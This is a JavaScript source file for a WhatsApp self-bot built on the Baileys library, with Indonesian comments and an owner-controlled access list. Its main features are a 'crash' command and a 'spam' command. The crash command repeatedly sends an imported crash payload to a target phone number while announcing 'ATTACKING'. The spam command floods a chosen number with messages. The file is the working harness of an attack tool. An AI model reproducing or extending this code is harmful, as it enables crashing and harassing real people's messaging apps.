// index.js - FINAL FIXED (Self-Bot + Database + Group Reply Support)
const { default: makeWASocket, useMultiFileAuthState, DisconnectReason, Browsers, delay } = require('@whiskeysockets/baileys');
const qrcode = require('qrcode-terminal');
const pino = require('pino');
const fs = require('fs');
const config = require('./config.js');
const readline = require('readline');
const chalk = require('chalk');

// Import functions
const { xeoninvisible } = require('./lib/crash.js');
const { showMenu } = require('./handler/menu.js');
const { spamMassal, blastPMMassal } = require('./lib/attack.js');
const { checkAccess, addAccess, removeAccess } = require('./lib/database.js');

let sock = null;
let rl = null;

// === FUNCTION INPUT NOMOR ===
async function askPhoneNumber() {
  if (!rl) {
    rl = readline.createInterface({ input: process.stdin, output: process.stdout });
  }
  const question = (text) => new Promise((resolve) => rl.question(text, resolve));
  
  console.log(chalk.red.bold('\n╔══════════════════════════════════════════════════╗'));
  console.log(chalk.red.bold('║   🚀 DARKFROSTWOLF SECURITY SYSTEM vFINAL 🚀     ║'));
  console.log(chalk.red.bold('╚══════════════════════════════════════════════════╝'));
  
  return await question(chalk.yellow('\n📱 MASUKKAN NOMOR HP BOT (628xx): '));
}

// === MAIN FUNCTION ===
async function connectToWhatsApp() {
  const { state, saveCreds } = await useMultiFileAuthState(config.sessionName);
  
  const socketConfig = {
    auth: state,
    logger: pino({ level: 'silent' }),
    browser: Browsers.ubuntu('Chrome'),
    markOnlineOnConnect: true,
    syncFullHistory: false,
    printQRInTerminal: false,
  };
  
  // LOGIKA PAIRING
  let phoneNumber;
  if (config.connectionMethod === 'pairing' && !state.creds.registered) {
    phoneNumber = await askPhoneNumber();
  }
  
  sock = makeWASocket(socketConfig);

  // FORCE PAIRING CODE
  if (config.connectionMethod === 'pairing' && !sock.authState.creds.registered) {
      console.log(chalk.yellow('⏳ Menunggu server WhatsApp... (3 detik)'));
      setTimeout(async () => {
        try {
            let code = await sock.requestPairingCode(phoneNumber);
            code = code?.match(/.{1,4}/g)?.join("-") || code;
            console.log(chalk.greenBright.bold(`\n🔑 KODE PAIRING: ${code}\n`));
        } catch (err) {
            console.log(chalk.red('❌ Gagal request kode: ' + err.message));
        }
      }, 3000);
  }

  sock.ev.on('creds.update', saveCreds);
  
  sock.ev.on('connection.update', async (update) => {
    const { connection, lastDisconnect, qr } = update;
    
    if (qr && config.connectionMethod === 'qr') qrcode.generate(qr, { small: true });
    
    if (connection === 'open') {
      console.log(chalk.green('\n✅ BOT CONNECTED & SECURE!'));
    }
    
    if (connection === 'close') {
      const reason = lastDisconnect.error?.output?.statusCode;
      if (reason === DisconnectReason.loggedOut) {
          console.log(chalk.red('⛔ Session Logged Out! Hapus folder session dan scan ulang.'));
          fs.rmSync(config.sessionName, { recursive: true, force: true });
          process.exit(1);
      } else {
          connectToWhatsApp();
      }
    }
  });
  
  // === MESSAGE HANDLER (SATU-SATUNYA LOGIC) ===
  sock.ev.on('messages.upsert', async (m) => {
    try {
        const msg = m.messages[0];
        if (!msg.message) return; // Ignore status updates

        // 1. Ambil Isi Pesan
        const text = msg.message.conversation || 
                     msg.message.extendedTextMessage?.text || 
                     msg.message.imageMessage?.caption || '';
        
        if (!text.startsWith(config.botPrefix)) return;

        // 2. Definisi Variable Penting (Self-Bot Friendly)
        const chatId = msg.key.remoteJid; // ID tempat chat (Grup/PC)
        const isGroup = chatId.endsWith('@g.us');
        
        // Cek siapa pengirimnya (Sender)
        let senderJid = isGroup ? (msg.key.participant || chatId) : chatId;
        if (msg.key.fromMe) {
            // Jika bot sendiri yang kirim
            senderJid = sock.user.id.split(':')[0] + '@s.whatsapp.net';
        }

        // --- FIX DEVICE ID HERE ---
        // Kita membuang bagian ':2' atau ':3' sebelum mengambil nomor
        // Dan membuang bagian '@s.whatsapp.net'
        const senderNumber = senderJid.split('@')[0].split(':')[0].replace(/\D/g, '');
        // --------------------------

        const command = text.slice(config.botPrefix.length).trim().split(' ')[0].toLowerCase();
        const args = text.slice(config.botPrefix.length + command.length).trim().split(' ');
        const pushname = msg.pushName || 'User';

        // 3. Cek Database Access
        const isOwner = senderNumber === config.ownerNumber;
        const isAllowed = isOwner || checkAccess(senderNumber);

        console.log(chalk.magenta(`📨 Cmd: ${command} | User: ${senderNumber} | Access: ${isAllowed}`));

        // === FITUR OWNER (MANAGE ACCESS) ===
        
        if (command === 'acces' || command === 'addaccess') {
            if (!isOwner) return sock.sendMessage(chatId, { text: '⛔ Lu bukan Owner gw!' });
            
            let target;
            if (msg.message.extendedTextMessage?.contextInfo?.mentionedJid?.length > 0) {
                // Fix juga untuk target yang di-tag (buang device id)
                target = msg.message.extendedTextMessage.contextInfo.mentionedJid[0].split('@')[0].split(':')[0].replace(/\D/g, '');
            } else if (args[0]) {
                target = args[0].replace(/\D/g, '');
            } else {
                return sock.sendMessage(chatId, { text: 'Tag orangnya atau masukkan nomor.' });
            }
            
            addAccess(target);
            return sock.sendMessage(chatId, { text: `✅ User ${target} ditambahkan ke database.` });
        }

        if (command === 'delacces' || command === 'removeaccess') {
            if (!isOwner) return sock.sendMessage(chatId, { text: '⛔ Lu bukan Owner gw!' });
            
            let target;
            if (msg.message.extendedTextMessage?.contextInfo?.mentionedJid?.length > 0) {
                target = msg.message.extendedTextMessage.contextInfo.mentionedJid[0].split('@')[0].split(':')[0].replace(/\D/g, '');
            } else if (args[0]) {
                target = args[0].replace(/\D/g, '');
            }
            
            removeAccess(target);
            return sock.sendMessage(chatId, { text: `🗑️ User ${target} dihapus dari database.` });
        }

        // === FILTER ACCESS ===
        if (!isAllowed) {
             return sock.sendMessage(chatId, { text: '🔒 ACCESS DENIED.' });
        }

        // === DAFTAR FITUR UTAMA ===

        if (command === 'menu') {
            await showMenu(sock, chatId, pushname);
        }

        else if (command === 'crash') {
            if (!config.enableCrash) return sock.sendMessage(chatId, { text: 'Fitur dimatikan.' });
            if (!args[0]) return sock.sendMessage(chatId, { text: `Format: ${config.botPrefix}crash 628xxx` });

            const target = args[0].replace(/\D/g, '');
            const targetJid = `${target}@s.whatsapp.net`;

            await sock.sendMessage(chatId, { text: `☠️ ATTACKING ${target}...` });

            try {
                const amount = args[1] ? parseInt(args[1]) : config.crashRepeat;
                for (let i = 0; i < amount; i++) {
                    await xeoninvisible(sock, targetJid);
                    console.log(chalk.red(`[💥] Hit ${i+1}/${amount}`));
                    await delay(1500);
                }
                await sock.sendMessage(chatId, { text: `✅ Done ${amount}x hit.` });
            } catch (err) {
                await sock.sendMessage(chatId, { text: '❌ Failed sending crash.' });
            }
        }

        else if (command === 'spam') {
            if (args.length < 3) return sock.sendMessage(chatId, { text: 'Format salah.' });
            await spamMassal(sock, args[0] + '@s.whatsapp.net', parseInt(args[1]), args.slice(2).join(' '));
            await sock.sendMessage(chatId, { text: '✅ Spam sent.' });
        }
        
        else if (command === 'ping') {
            await sock.sendMessage(chatId, { text: '🏓 Pong! System Secure.' });
        }

    } catch (error) {
        console.error('Handler Error:', error);
    }
  });
  
  return sock;
}

// Start bot
connectToWhatsApp();
